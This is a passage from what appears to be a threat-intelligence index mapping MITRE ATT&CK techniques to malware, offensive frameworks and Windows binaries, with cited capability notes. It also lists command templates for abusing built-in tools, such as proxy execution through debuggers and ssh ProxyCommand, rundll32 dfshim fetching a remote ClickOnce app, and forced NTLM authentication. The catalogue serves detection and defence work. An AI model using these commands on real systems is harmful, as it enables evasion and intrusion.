- [Reg](../tools/unknown/reg.md) — explicit, source. [Reg](https://attack.mitre.org/software/S0075) may be used to interact with and modify the Windows Registry of a local or remote system at the command-line interface.(Citation: Microsoft Reg)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) has full control of the Registry, including the ability to modify it.(Citation: Riskiq Remcos Jan 2018)(Citation: Fortinet Remcos Campaign NOV 2024)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can modify registry keys, including to enable or disable Remote Desktop Protocol (RDP).(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1113 - Screen Capture

- [AsyncRAT](../tools/unknown/asyncrat.md) — explicit, source. [AsyncRAT](https://attack.mitre.org/software/S1087) has the ability to view the screen on compromised hosts.(Citation: AsyncRAT GitHub)
- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) can take screenshots on compromised hosts.(Citation: Palo Alto Brute Ratel July 2022)
- [ConnectWise](../tools/unknown/connectwise.md) — explicit, source. [ConnectWise](https://attack.mitre.org/software/S0591) can take screenshots on remote hosts.(Citation: Anomali Static Kitten February 2021)
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) is capable of capturing screenshots on Windows and macOS systems.(Citation: Github PowerShell Empire)
- [PcShare](../tools/unknown/pcshare.md) — explicit, source. [PcShare](https://attack.mitre.org/software/S1050) can take screen shots of a compromised machine.(Citation: Bitdefender FunnyDream Campaign November 2020)
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Get-TimedScreenshot</code> Exfiltration module can take screenshots at regular intervals.(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)
- [Psr.exe](../tools/windows/psr.exe.md) — explicit, source. Command metadata lists T1113: psr.exe /start /output {PATH_ABSOLUTE:.zip} /sc 1 /gui 0
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can drop a mouse-logger that will take small screenshots around at each click and then send back to the server.(Citation: GitHub Pupy)
- [Quick Assist](../tools/unknown/quick-assist.md) — explicit, source. [Quick Assist](https://attack.mitre.org/software/S1209) allows for the remote administrator to take screenshots of the running system.(Citation: Microsoft Quick Assist 2024)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) takes automated screenshots of the infected machine.(Citation: Riskiq Remcos Jan 2018)(Citation: Fortinet Remcos Campaign NOV 2024)
- [RemoteUtilities](../tools/unknown/remoteutilities.md) — explicit, source. [RemoteUtilities](https://attack.mitre.org/software/S0592) can take screenshots on a compromised host.(Citation: Trend Micro Muddy Water March 2021)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can take a screenshot of the current desktop.(Citation: GitHub SILENTTRINITY Modules July 2019)
- [Sliver](../tools/unknown/sliver.md) — explicit, source. [Sliver](https://attack.mitre.org/software/S0633) can take screenshots of the victim’s active display.(Citation: GitHub Sliver Screen)

## T1114.001 - Local Email Collection

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) has the ability to collect emails on a target system.(Citation: Github PowerShell Empire)
- [Out1](../tools/unknown/out1.md) — explicit, source. [Out1](https://attack.mitre.org/software/S0594) can parse e-mails on a target machine.(Citation: Trend Micro Muddy Water March 2021)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can interact with a victim’s Outlook session and look through folders and emails.(Citation: GitHub Pupy)

## T1114.002 - Remote Email Collection

- [MailSniper](../tools/unknown/mailsniper.md) — explicit, source. [MailSniper](https://attack.mitre.org/software/S0413) can be used for searching through email in Exchange and Office 365 environments.(Citation: GitHub MailSniper)

## T1115 - Clipboard Data

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can harvest clipboard data on both Windows and macOS systems.(Citation: Github PowerShell Empire)
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) can retrieve the current content of the user clipboard.(Citation: Github Koadic)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) steals and modifies data from the clipboard.(Citation: Riskiq Remcos Jan 2018)(Citation: Fortinet Remcos Campaign NOV 2024)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can monitor Clipboard text and can use `System.Windows.Forms.Clipboard.GetText()` to collect data from the clipboard.(Citation: Github_SILENTTRINITY)  

## T1119 - Automated Collection

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can automatically gather the username, domain name, machine name, and other information from a compromised system.(Citation: Talos Frankenstein June 2019)
- [Mythic](../tools/unknown/mythic.md) — explicit, source. [Mythic](https://attack.mitre.org/software/S0699) supports scripting of file downloads from agents.(Citation: Mythc Documentation)	
- [NPPSPY](../tools/unknown/nppspy.md) — explicit, source. [NPPSPY](https://attack.mitre.org/software/S1131) collection is automatically recorded to a specified file on the victim machine.(Citation: Huntress NPPSPY 2022)
- [Pacu](../tools/unknown/pacu.md) — explicit, source. [Pacu](https://attack.mitre.org/software/S1091) can automatically collect data, such as CloudFormation templates, EC2 user data, AWS Inspector reports, and IAM credential reports.(Citation: GitHub Pacu)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) contains a module for recursively parsing through files and directories to gather valid credit card numbers.(Citation: GitHub PoshC2)
- [ROADTools](../tools/unknown/roadtools.md) — explicit, source. [ROADTools](https://attack.mitre.org/software/S0684) automatically gathers data from Azure AD environments using the Azure Graph API.(Citation: Roadtools)
- [ShimRatReporter](../tools/unknown/shimratreporter.md) — explicit, source. [ShimRatReporter](https://attack.mitre.org/software/S0445) gathered information automatically, without instruction from a C2, related to the user and host machine that is compiled into a report and sent to the operators.(Citation: FOX-IT May 2016 Mofang)

## T1123 - Audio Capture

- [Imminent Monitor](../tools/unknown/imminent-monitor.md) — explicit, source. [Imminent Monitor](https://attack.mitre.org/software/S0434) has a remote microphone monitoring capability.(Citation: Imminent Unit42 Dec2019)(Citation: QiAnXin APT-C-36 Feb2019)
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Get-MicrophoneAudio</code> Exfiltration module can record system microphone audio.(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can record sound with the microphone.(Citation: GitHub Pupy)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) can capture data from the system’s microphone.(Citation: Fortinet Remcos Feb 2017)(Citation: Fortinet Remcos Campaign NOV 2024)

## T1124 - System Time Discovery

- [AsyncRAT](../tools/unknown/asyncrat.md) — explicit, source. [AsyncRAT](https://attack.mitre.org/software/S1087) can check whether the current system hour and day of the week are within operating hours defined it its configuration.(Citation: ESET MirrorFace 2025)
- [Net](../tools/unknown/net.md) — explicit, source. The <code>net time</code> command can be used in [Net](https://attack.mitre.org/software/S0039) to determine the local or remote system time.(Citation: TechNet Net Time)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can collect start time information from a compromised host.(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1125 - Video Capture

- [AsyncRAT](../tools/unknown/asyncrat.md) — explicit, source. [AsyncRAT](https://attack.mitre.org/software/S1087) can record screen content on targeted systems.(Citation: AsyncRAT GitHub)
- [ConnectWise](../tools/unknown/connectwise.md) — explicit, source. [ConnectWise](https://attack.mitre.org/software/S0591) can record video on remote hosts.(Citation: Anomali Static Kitten February 2021)
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can capture webcam data on Windows and macOS systems.(Citation: Github PowerShell Empire)
- [Imminent Monitor](../tools/unknown/imminent-monitor.md) — explicit, source. [Imminent Monitor](https://attack.mitre.org/software/S0434) has a remote webcam monitoring capability.(Citation: Imminent Unit42 Dec2019)(Citation: QiAnXin APT-C-36 Feb2019)
- [PcShare](../tools/unknown/pcshare.md) — explicit, source. [PcShare](https://attack.mitre.org/software/S1050) can capture camera video as part of its collection process.(Citation: Bitdefender FunnyDream Campaign November 2020)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can access a connected webcam and capture pictures.(Citation: GitHub Pupy)
- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. [QuasarRAT](https://attack.mitre.org/software/S0262) can perform webcam viewing.(Citation: GitHub QuasarRAT)(Citation: Volexity Patchwork June 2018)
- [Quick Assist](../tools/unknown/quick-assist.md) — explicit, source. [Quick Assist](https://attack.mitre.org/software/S1209) allows for the remote administrator to view the interactive session of the running machine, including full screen activity.(Citation: Microsoft Quick Assist 2024)(Citation: Microsoft Storm-1811 2024)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) can access a system’s webcam and take pictures.(Citation: Fortinet Remcos Feb 2017)

## T1127 - Trusted Developer Utilities Proxy Execution

- [AppCert.exe](../tools/windows/appcert.exe.md) — explicit, source. Command metadata lists T1127: appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.exe} -reportoutputpath {PATH_ABSOLUTE:.xml}
- [AppLauncher.exe](../tools/windows/applauncher.exe.md) — explicit, source. Command metadata lists T1127: AppLauncher.exe {PATH_ABSOLUTE:.exe}
- [Aspnet_Compiler.exe](../tools/windows/aspnet-compiler.exe.md) — explicit, source. Command metadata lists T1127: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\users\cpl.internal\desktop\asptest\ -f C:\users\cpl.internal\desktop\asptest\none -u
- [Cdb.exe](../tools/windows/cdb.exe.md) — explicit, source. Command metadata lists T1127: cdb.exe -c {PATH:.txt} "{CMD}"
- [Csc.exe](../tools/windows/csc.exe.md) — explicit, source. Command metadata lists T1127: csc -target:library {PATH:.cs}
- [Devtoolslauncher.exe](../tools/windows/devtoolslauncher.exe.md) — explicit, source. Command metadata lists T1127: devtoolslauncher.exe LaunchForDebug {PATH_ABSOLUTE:.exe} "{CMD:args}" test
- [Dxcap.exe](../tools/windows/dxcap.exe.md) — explicit, source. Command metadata lists T1127: dxcap.exe -usage
- [Ilasm.exe](../tools/windows/ilasm.exe.md) — explicit, source. Command metadata lists T1127: ilasm.exe {PATH_ABSOLUTE:.txt} /dll
- [IntelliTrace.exe](../tools/windows/intellitrace.exe.md) — explicit, source. Command metadata lists T1127: IntelliTrace.exe launch /cp:"collectionplan.xml" /f:"c:\users\public\log" "C:\Windows\System32\calc.exe"
- [Jsc.exe](../tools/windows/jsc.exe.md) — explicit, source. Command metadata lists T1127: jsc.exe /t:library {PATH:.js}
- [Mftrace.exe](../tools/windows/mftrace.exe.md) — explicit, source. Command metadata lists T1127: Mftrace.exe {PATH:.exe}
- [Microsoft.NodejsTools.PressAnyKey.exe](../tools/windows/microsoft.nodejstools.pressanykey.exe.md) — explicit, source. Command metadata lists T1127: Microsoft.NodejsTools.PressAnyKey.exe normal 1 {PATH:.exe}
- [Microsoft.Workflow.Compiler.exe](../tools/windows/microsoft.workflow.compiler.exe.md) — explicit, source. Command metadata lists T1127: Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}
- [Mpiexec.exe](../tools/windows/mpiexec.exe.md) — explicit, source. Command metadata lists T1127: mpiexec.exe {CMD}
- [Ntsd.exe](../tools/windows/ntsd.exe.md) — explicit, source. Command metadata lists T1127: ntsd.exe -g {CMD}
- [Pixtool.exe](../tools/windows/pixtool.exe.md) — explicit, source. Command metadata lists T1127: pixtool.exe launch {PATH_ABSOLUTE:.exe}
- [Remote.exe](../tools/windows/remote.exe.md) — explicit, source. Command metadata lists T1127: Remote.exe /s {PATH_SMB:.exe} anythinghere
- [Tracker.exe](../tools/windows/tracker.exe.md) — explicit, source. Command metadata lists T1127: Tracker.exe /d {PATH:.dll} /c C:\Windows\write.exe
- [Ttdinject.exe](../tools/windows/ttdinject.exe.md) — explicit, source. Command metadata lists T1127: ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams "7 tmp.run 0 0 0 0 0 0 0 0 0 0" /launch "{PATH:.exe}"
- [Tttracer.exe](../tools/windows/tttracer.exe.md) — explicit, source. Command metadata lists T1127: tttracer.exe {PATH_ABSOLUTE:.exe}
- [VSDiagnostics.exe](../tools/windows/vsdiagnostics.exe.md) — explicit, source. Command metadata lists T1127: VSDiagnostics.exe start 2 /launch:{PATH:.exe} /launchArgs:"{CMD:args}"
- [VSLaunchBrowser.exe](../tools/windows/vslaunchbrowser.exe.md) — explicit, source. Command metadata lists T1127: VSLaunchBrowser.exe .exe {PATH_SMB}
- [WFMFormat.exe](../tools/windows/wfmformat.exe.md) — explicit, source. Command metadata lists T1127: WFMFormat.exe
- [Wfc.exe](../tools/windows/wfc.exe.md) — explicit, source. Command metadata lists T1127: wfc.exe {PATH_ABSOLUTE:.xoml}
- [WinDbg.exe](../tools/windows/windbg.exe.md) — explicit, source. Command metadata lists T1127: windbg.exe -g {CMD}
- [adplus.exe](../tools/windows/adplus.exe.md) — explicit, source. Command metadata lists T1127: adplus.exe -crash -o "{PATH_ABSOLUTE:folder}" -sc {PATH:.exe}
- [csi.exe](../tools/windows/csi.exe.md) — explicit, source. Command metadata lists T1127: csi.exe {PATH:.cs}
- [dnx.exe](../tools/windows/dnx.exe.md) — explicit, source. Command metadata lists T1127: dnx.exe {PATH_ABSOLUTE:folder}
- [rcsi.exe](../tools/windows/rcsi.exe.md) — explicit, source. Command metadata lists T1127: rcsi.exe {PATH:.csx}
- [te.exe](../tools/windows/te.exe.md) — explicit, source. Command metadata lists T1127: te.exe {PATH:.dll}
- [vbc.exe](../tools/windows/vbc.exe.md) — explicit, source. Command metadata lists T1127: vbc -reference:Microsoft.VisualBasic.dll {PATH_ABSOLUTE:.vb}
- [vsjitdebugger.exe](../tools/windows/vsjitdebugger.exe.md) — explicit, source. Command metadata lists T1127: Vsjitdebugger.exe {PATH:.exe}
- [vstest.console.exe](../tools/windows/vstest.console.exe.md) — explicit, source. Command metadata lists T1127: vstest.console.exe {PATH:.dll}

## T1127.001 - MSBuild

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can use built-in modules to abuse trusted utilities like MSBuild.exe.(Citation: Github PowerShell Empire)

- [Msbuild.exe](../tools/windows/msbuild.exe.md) — explicit, source. Command metadata lists T1127.001: msbuild.exe {PATH:.proj}

## T1127.002 - ClickOnce

- [Dfshim.dll](../tools/windows/dfshim.dll.md) — explicit, source. Command metadata lists T1127.002: rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
- [Dfsvc.exe](../tools/windows/dfsvc.exe.md) — explicit, source. Command metadata lists T1127.002: rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}

## T1132 - Data Encoding

- [Mythic](../tools/unknown/mythic.md) — explicit, source. [Mythic](https://attack.mitre.org/software/S0699) provides various transform functions to encode and/or randomize C2 data.(Citation: Mythc Documentation)	
- [evilginx2](../tools/unknown/evilginx2.md) — explicit, source. [evilginx2](https://attack.mitre.org/software/S9003) can randomly generate and Base64 encode parameters in phishing links to defeat static detection.(Citation: Breakdev Evilginx 2.4 SEP 2020)

## T1132.001 - Standard Encoding

- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) can serialize collected data with Protobuf.(Citation: Check Point Blind Eagle MAR 2025)
- [Sliver](../tools/unknown/sliver.md) — explicit, source. [Sliver](https://attack.mitre.org/software/S0633) can use standard encoding techniques like gzip and hex to ASCII to encode the C2 communication payload.(Citation: GitHub Sliver HTTP)

## T1134 - Access Token Manipulation

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can use [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Invoke-TokenManipulation</code> to manipulate access tokens.(Citation: Github PowerShell Empire)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) can use Invoke-TokenManipulation for manipulating tokens.(Citation: GitHub PoshC2)
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Invoke-TokenManipulation</code> Exfiltration module can be used to manipulate tokens.(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)
- [Sliver](../tools/unknown/sliver.md) — explicit, source. [Sliver](https://attack.mitre.org/software/S0633) has the ability to manipulate user tokens on targeted Windows systems.(Citation: Bishop Fox Sliver Framework August 2019)(Citation: GitHub Sliver C2)

## T1134.001 - Token Impersonation／Theft

- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can obtain a list of SIDs and provide the option for selecting process tokens to impersonate.(Citation: GitHub Pupy)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can find a process owned by a specific user and impersonate the associated token.(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1134.002 - Create Process with Token

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can use <code>Invoke-RunAs</code> to make tokens.(Citation: Github PowerShell Empire)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) can use Invoke-RunAs to make tokens.(Citation: GitHub PoshC2)

## T1134.003 - Make and Impersonate Token

- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can make tokens from known credentials.(Citation: Github_SILENTTRINITY) 

## T1134.005 - SID-History Injection

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can add a SID-History to a user if on a domain controller.(Citation: Github PowerShell Empire)
- [Mimikatz](../tools/unknown/mimikatz.md) — explicit, source. [Mimikatz](https://attack.mitre.org/software/S0002)'s <code>MISC::AddSid</code> module can append any SID or user/group account to a user's SID-History. [Mimikatz](https://attack.mitre.org/software/S0002) also utilizes [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) to expand the scope of other components such as generated Kerberos Golden Tickets and DCSync beyond a single domain.(Citation: Adsecurity Mimikatz Guide)(Citation: AdSecurity Kerberos GT Aug 2015)

## T1135 - Network Share Discovery

- [CrackMapExec](../tools/unknown/crackmapexec.md) — explicit, source. [CrackMapExec](https://attack.mitre.org/software/S0488) can enumerate the shared folders and associated permissions for a targeted network.(Citation: CME Github September 2018)
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can find shared drives on the local system.(Citation: Github PowerShell Empire)
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) can scan local network for open SMB.(Citation: Github Koadic)
- [Net](../tools/unknown/net.md) — explicit, source. The <code>net view \\remotesystem</code> and <code>net share</code> commands in [Net](https://attack.mitre.org/software/S0039) can be used to find shared drives and directories on remote and local systems respectively.(Citation: Savill 1999)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can list local and remote shared drives and folders over SMB.(Citation: GitHub Pupy)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can enumerate shares on a compromised host.(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1136.001 - Local Account

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) has a module for creating a local user if permissions allow.(Citation: Github PowerShell Empire)
- [Net](../tools/unknown/net.md) — explicit, source. The <code>net user username \password</code> commands in [Net](https://attack.mitre.org/software/S0039) can be used to create a local account.(Citation: Savill 1999)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can user PowerView to execute “net user” commands and create local system accounts.(Citation: GitHub Pupy)

## T1136.002 - Domain Account

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) has a module for creating a new domain user if permissions allow.(Citation: Github PowerShell Empire)
- [Net](../tools/unknown/net.md) — explicit, source. The <code>net user username \password \domain</code> commands in [Net](https://attack.mitre.org/software/S0039) can be used to create a domain account.(Citation: Savill 1999)
- [PsExec](../tools/unknown/psexec.md) — explicit, source. [PsExec](https://attack.mitre.org/software/S0029) has the ability to remotely create accounts on target systems.(Citation: NCC Group Fivehands June 2021)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can user PowerView to execute “net user” commands and create domain accounts.(Citation: GitHub Pupy)

## T1136.003 - Cloud Account

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. [AADInternals](https://attack.mitre.org/software/S0677) can create new Azure AD users.(Citation: AADInternals Documentation)

## T1137.003 - Outlook Forms

- [Ruler](../tools/unknown/ruler.md) — explicit, source. [Ruler](https://attack.mitre.org/software/S0358) can be used to automate the abuse of Outlook Forms to establish persistence.(Citation: SensePost Ruler GitHub)

## T1137.004 - Outlook Home Page

- [Ruler](../tools/unknown/ruler.md) — explicit, source. [Ruler](https://attack.mitre.org/software/S0358) can be used to automate the abuse of Outlook Home Pages to establish persistence.(Citation: SensePost Ruler GitHub) 

## T1137.005 - Outlook Rules

- [Ruler](../tools/unknown/ruler.md) — explicit, source. [Ruler](https://attack.mitre.org/software/S0358) can be used to automate the abuse of Outlook Rules to establish persistence.(Citation: SensePost Ruler GitHub) 

## T1140 - Deobfuscate／Decode Files or Information

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) has the ability to deobfuscate its payload prior to execution.(Citation: Palo Alto Brute Ratel July 2022)
- [Certutil.exe](../tools/windows/certutil.exe.md) — explicit, source. Command metadata lists T1140: certutil -decodehex {PATH:.hex} {PATH}
- [Expand](../tools/unknown/expand.md) — explicit, source. [Expand](https://attack.mitre.org/software/S0361) can be used to decompress a local or remote CAB file into an executable.(Citation: Microsoft Expand Utility)
- [Imminent Monitor](../tools/unknown/imminent-monitor.md) — explicit, source. [Imminent Monitor](https://attack.mitre.org/software/S0434) has decoded malware components that are then dropped to the system.(Citation: QiAnXin APT-C-36 Feb2019)
- [IronNetInjector](../tools/unknown/ironnetinjector.md) — explicit, source. [IronNetInjector](https://attack.mitre.org/software/S0581) has the ability to decrypt embedded .NET and PE payloads.(Citation: Unit 42 IronNetInjector February 2021 )
- [PcShare](../tools/unknown/pcshare.md) — explicit, source. [PcShare](https://attack.mitre.org/software/S1050) has decrypted its strings by applying a XOR operation and a decompression using a custom implemented LZM algorithm.(Citation: Bitdefender FunnyDream Campaign November 2020)
- [certutil](../tools/unknown/certutil.md) — explicit, source. [certutil](https://attack.mitre.org/software/S0160) has been used to decode binaries hidden inside certificate files as Base64 information.(Citation: Malwarebytes Targeted Attack against Saudi Arabia)

## T1185 - Browser Session Hijacking

- [evilginx2](../tools/unknown/evilginx2.md) — explicit, source. [evilginx2](https://attack.mitre.org/software/S9003) can inject custom POST arguments into requests to silently enable "Remember Me" options during authentication to stay logged in across browser sessions.(Citation: Breakdev Evilginx 2.2 NOV 2018)

## T1187 - Forced Authentication

- [Rpcping.exe](../tools/windows/rpcping.exe.md) — explicit, source. Command metadata lists T1187: rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM

## T1190 - Exploit Public-Facing Application

- [Havij](../tools/unknown/havij.md) — explicit, source. [Havij](https://attack.mitre.org/software/S0224) is used to automate SQL injection.(Citation: Check Point Havij Analysis)
- [sqlmap](../tools/unknown/sqlmap.md) — explicit, source. [sqlmap](https://attack.mitre.org/software/S0225) can be used to automate exploitation of SQL injection vulnerabilities.(Citation: sqlmap Introduction)

## T1197 - BITS Jobs

- [BITSAdmin](../tools/unknown/bitsadmin.md) — explicit, source. [BITSAdmin](https://attack.mitre.org/software/S0190) can be used to create [BITS Jobs](https://attack.mitre.org/techniques/T1197) to launch a malicious process.(Citation: TrendMicro Tropic Trooper Mar 2018)

## T1201 - Password Policy Discovery

- [CrackMapExec](../tools/unknown/crackmapexec.md) — explicit, source. [CrackMapExec](https://attack.mitre.org/software/S0488) can discover the password policies applied to the target system.(Citation: CME Github September 2018)
- [Net](../tools/unknown/net.md) — explicit, source. The <code>net accounts</code> and <code>net accounts /domain</code> commands with [Net](https://attack.mitre.org/software/S0039) can be used to obtain password policy information.(Citation: Savill 1999)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) can use <code>Get-PassPol</code> to enumerate the domain password policy.(Citation: GitHub PoshC2)

## T1202 - Indirect Command Execution

- [Bash.exe](../tools/windows/bash.exe.md) — explicit, source. Command metadata lists T1202: bash.exe -c "{CMD}"
- [Conhost.exe](../tools/windows/conhost.exe.md) — explicit, source. Command metadata lists T1202: conhost.exe --headless {CMD}
- [Diskshadow.exe](../tools/windows/diskshadow.exe.md) — explicit, source. Command metadata lists T1202: diskshadow> exec {PATH:.exe}
- [Explorer.exe](../tools/windows/explorer.exe.md) — explicit, source. Command metadata lists T1202: explorer.exe {PATH_ABSOLUTE:.exe}
- [Forfiles](../tools/unknown/forfiles.md) — explicit, source. [Forfiles](https://attack.mitre.org/software/S0193) can be used to subvert controls and possibly conceal command execution by not directly invoking [cmd](https://attack.mitre.org/software/S0106).(Citation: VectorSec ForFiles Aug 2017)(Citation: Evi1cg Forfiles Nov 2017)
- [Forfiles.exe](../tools/windows/forfiles.exe.md) — explicit, source. Command metadata lists T1202: forfiles /p c:\windows\system32 /m notepad.exe /c "{CMD}"
- [Ftp.exe](../tools/windows/ftp.exe.md) — explicit, source. Command metadata lists T1202: echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt
- [Logger.exe](../tools/windows/logger.exe.md) — explicit, source. Command metadata lists T1202: logger.exe "{CMD}"
- [Msdt.exe](../tools/windows/msdt.exe.md) — explicit, source. Command metadata lists T1202: msdt.exe /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe"
- [OpenConsole.exe](../tools/windows/openconsole.exe.md) — explicit, source. Command metadata lists T1202: OpenConsole.exe {PATH:.exe}
- [Pcalua.exe](../tools/windows/pcalua.exe.md) — explicit, source. Command metadata lists T1202: pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java
- [Pcwrun.exe](../tools/windows/pcwrun.exe.md) — explicit, source. Command metadata lists T1202: Pcwrun.exe /../../$(calc).exe
- [Procdump.exe](../tools/windows/procdump.exe.md) — explicit, source. Command metadata lists T1202: procdump.exe -md {PATH:.dll} foobar
- [Scriptrunner.exe](../tools/windows/scriptrunner.exe.md) — explicit, source. Command metadata lists T1202: Scriptrunner.exe -appvscript {PATH:.exe}
- [Sftp.exe](../tools/windows/sftp.exe.md) — explicit, source. Command metadata lists T1202: sftp -o ProxyCommand="{CMD}" .
- [Unregmp2.exe](../tools/windows/unregmp2.exe.md) — explicit, source. Command metadata lists T1202: rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media Player" & copy C:\Windows\System32\calc.exe "%temp%\lolbin\Windows Media Player\wmpnscfg.exe" >nul && cmd /V...
- [Vshadow.exe](../tools/windows/vshadow.exe.md) — explicit, source. Command metadata lists T1202: vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:
- [Wlrmdr.exe](../tools/windows/wlrmdr.exe.md) — explicit, source. Command metadata lists T1202: wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u {PATH:.exe}
- [Wsl.exe](../tools/windows/wsl.exe.md) — explicit, source. Command metadata lists T1202: wsl.exe --exec bash -c "{CMD}"
- [XBootMgr.exe](../tools/windows/xbootmgr.exe.md) — explicit, source. Command metadata lists T1202: xbootmgr.exe -trace "{boot|hibernate|standby|shutdown|rebootCycle}" -preTraceCmd {PATH:.exe}
- [XBootMgrSleep.exe](../tools/windows/xbootmgrsleep.exe.md) — explicit, source. Command metadata lists T1202: xbootmgrsleep.exe 1000 {PATH:.exe}
- [ssh.exe](../tools/windows/ssh.exe.md) — explicit, source. Command metadata lists T1202: ssh -o ProxyCommand="{CMD}" .
- [winfile.exe](../tools/windows/winfile.exe.md) — explicit, source. Command metadata lists T1202: winfile.exe {PATH:.exe}
- [wt.exe](../tools/windows/wt.exe.md) — explicit, source. Command metadata lists T1202: wt.exe {CMD}

## T1204.002 - Malicious File

- [AsyncRAT](../tools/unknown/asyncrat.md) — explicit, source. [AsyncRAT](https://attack.mitre.org/software/S1087) has been executed through victims opening malicious file attachments.(Citation: Recorded Future TAG-144 AUG 2025)
- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) has gained execution through users opening malicious documents.(Citation: Palo Alto Brute Ratel July 2022)
- [CARROTBALL](../tools/unknown/carrotball.md) — explicit, source. [CARROTBALL](https://attack.mitre.org/software/S0465) has been executed through users being lured into opening malicious e-mail attachments.(Citation: Unit 42 CARROTBAT January 2020)
